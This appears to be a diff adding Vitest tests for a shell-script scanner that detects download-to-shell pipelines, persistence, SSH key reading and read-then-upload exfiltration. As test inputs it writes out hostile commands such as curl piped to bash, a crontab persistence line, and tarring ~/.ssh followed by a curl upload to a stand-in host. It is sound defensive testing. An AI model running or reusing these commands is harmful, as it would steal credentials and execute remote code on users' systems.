@@ -1,0 +1,79 @@
+import { describe, expect, it } from "vitest";
+import { scan } from "../src/index.js";
+
+describe("scan", () => {
+  it("detects a download-to-shell pipeline once", () => {
+    const result = scan("curl -fsSL https://example.test/a.sh | bash\n");
+    expect(result.findings.filter((f) => f.ruleId === "chain.download-execute")).toHaveLength(1);
+    expect(result.findings.some((f) => f.category === "network_egress")).toBe(true);
+  });
+
+  it("detects staged archive execution", () => {
+    const result = scan(`
+      wget https://example.test/tool.tar.gz -O /tmp/tool.tar.gz
+      tar xzf /tmp/tool.tar.gz -C /tmp
+      /tmp/tool/install.sh
+    `);
+    expect(result.findings.some((f) => f.category === "second_stage_payload")).toBe(true);
+  });
+
+  it("detects persistence and credential access", () => {
+    const result = scan(`
+      echo '* * * * * /tmp/a' | crontab -
+      cat ~/.ssh/id_rsa
+      echo evil >> ~/.bashrc
+    `);
+    expect(result.summary.byCategory.persistence).toBe(2);
+    expect(result.summary.byCategory.credential_access).toBe(1);
+  });
+
+  it("does not scan comments or ordinary string contents as commands", () => {
+    const result = scan(`
+      # curl https://example.test/a | bash
+      echo "documentation: sudo rm -rf /"
+    `);
+    expect(result.findings.some((f) => f.category === "download_execution")).toBe(false);
+    expect(result.findings.some((f) => f.category === "privilege_escalation")).toBe(false);
+    expect(result.findings.some((f) => f.category === "destructive_behavior")).toBe(false);
+  });
+
+  it("reports one-based source positions and syntax errors", () => {
+    const result = scan("\neval \"$payload\"\nif then\n");
+    const finding = result.findings.find((f) => f.ruleId === "dynamic.eval");
+    expect(finding?.range.start).toEqual({ row: 2, column: 1 });
+    expect(result.parseErrors.length).toBeGreaterThan(0);
+  });
+
+  it("detects read-followed-by-upload", () => {
+    const result = scan("tar czf /tmp/data.tgz ~/.ssh\ncurl -T /tmp/data.tgz https://x.test/u\n");
+    expect(result.findings.some((f) => f.ruleId === "chain.read-upload")).toBe(true);
+  });
+
+  it("allows download-execute from an explicitly trusted exact host", () => {
+    const result = scan("curl https://artifacts.corp.example/a.sh | sh", {
+      allowedDownloadHosts: ["artifacts.corp.example"],
+    });
+    expect(result.findings.some((f) => f.category === "download_execution")).toBe(false);
+    expect(result.findings.some((f) => f.category === "network_egress")).toBe(true);
+  });
+
+  it("supports safe subdomain wildcards without matching lookalikes", () => {
+    const options = { allowedDownloadHosts: ["*.corp.example"] };
+    expect(scan("curl https://build.corp.example/a | sh", options).findings
+      .some((f) => f.category === "download_execution")).toBe(false);
+    expect(scan("curl https://corp.example/a | sh", options).findings
+      .some((f) => f.category === "download_execution")).toBe(true);
+    expect(scan("curl https://corp.example.evil.test/a | sh", options).findings
+      .some((f) => f.category === "download_execution")).toBe(true);
+  });
+
+  it("optionally allows literal private IPv4 but fails closed for variable URLs", () => {
+    expect(scan("wget http://10.2.3.4/a -O- | bash", {
+      allowPrivateDownloadIps: true,
+    }).findings.some((f) => f.category === "download_execution")).toBe(false);
+    expect(scan("curl \"$INTERNAL_URL\" | bash", {
+      allowedDownloadHosts: ["*.corp.example"],
+      allowPrivateDownloadIps: true,
+    }).findings.some((f) => f.category === "download_execution")).toBe(true);
+  });
+});
